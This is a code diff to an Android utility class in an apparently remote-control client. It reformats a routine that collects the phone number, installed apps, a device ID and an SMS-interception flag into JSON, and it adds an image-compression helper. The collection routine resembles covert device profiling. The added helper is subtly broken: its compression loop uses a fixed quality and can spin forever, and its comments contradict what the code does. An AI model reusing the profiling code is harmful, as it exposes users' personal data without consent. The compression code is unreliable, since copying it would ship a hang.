@@ -1,6 +1,8 @@
 package contol.android.kamike.com.contolclient.utils;
 
 import android.content.Context;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.os.Build;
 import android.os.Environment;
 import android.telephony.TelephonyManager;
@@ -11,6 +13,8 @@ import com.blankj.utilcode.util.AppUtils;
 import com.blankj.utilcode.util.FileIOUtils;
 import com.blankj.utilcode.util.FileUtils;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.UUID;
@@ -27,22 +31,22 @@ public class AllUtils {
         ClientInfoBean info = new ClientInfoBean();
         info.androidVersion = android.os.Build.VERSION.RELEASE;
 
-        ArrayList<AppInfoBean> list=new ArrayList<>();
-        for(AppUtils.AppInfo app:AppUtils.getAppsInfo()){
-            AppInfoBean myApp=new AppInfoBean();
-            myApp.isSystem=app.isSystem();
-            myApp.name=app.getName();
+        ArrayList<AppInfoBean> list = new ArrayList<>();
+        for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
+            AppInfoBean myApp = new AppInfoBean();
+            myApp.isSystem = app.isSystem();
+            myApp.name = app.getName();
             //myApp.packageName=app.getPackageName();
-            myApp.versionName=app.getVersionName();
+            myApp.versionName = app.getVersionName();
             list.add(myApp);
         }
-        info.appList =list ;
+        info.appList = list;
 
         info.deviceId = getUniquePsuedoID();
         info.isInterceptSMS = false;
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         info.phoneNumber = tm.getLine1Number();
-        info.address="";
+        info.address = "";
         return JSON.toJSONString(info);
     }
 
@@ -82,4 +86,46 @@ public class AllUtils {
         //使用硬件信息拼凑出来的15位号码
         return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
     }
+
+    public static Bitmap compBmp(String bmpPath) {
+        if (!new File(bmpPath).exists()) {
+            return null;
+        }
+        BitmapFactory.Options newOpts = new BitmapFactory.Options();
+        // 开始读入图片，此时把options.inJustDecodeBounds 设回true了
+        newOpts.inJustDecodeBounds = true;
+        Bitmap bitmap = BitmapFactory.decodeFile(bmpPath, newOpts);
+
+        int w = newOpts.outWidth;
+        int h = newOpts.outHeight;
+        float hh = 1920f;
+        float ww = 1080f;
+        // 缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
+        int be = 1;// be=1表示不缩放
+        if (w > h && w > ww) {// 如果宽度大的话根据宽度固定大小缩放
+            be = (int) (newOpts.outWidth / ww);
+        } else if (w < h && h > hh) {// 如果高度高的话根据宽度固定大小缩放
+            be = (int) (newOpts.outHeight / hh);
+        }
+        if (be <= 0)
+            be = 1;
+        newOpts.inSampleSize = be;// 设置缩放比例
+        // 重新读入图片，注意此时已经把options.inJustDecodeBounds 设回false了
+
+        newOpts.inJustDecodeBounds = false;
+        bitmap = BitmapFactory.decodeFile(bmpPath, newOpts);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
+        while (baos.toByteArray().length > 1024 * 1024) {
+            baos.reset();// 重置baos即清空baos
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);// 这里压缩50%，把压缩后的数据存放到baos中
+            System.out.println("压缩====");
+        }
+        ByteArrayInputStream isBm = new ByteArrayInputStream(baos.toByteArray());
+        isBm = new ByteArrayInputStream(baos.toByteArray());
+        bitmap = BitmapFactory.decodeStream(isBm, null, newOpts);
+        return bitmap;// 压缩好比例大小后再进行质量压缩
+    }
+
+
 }
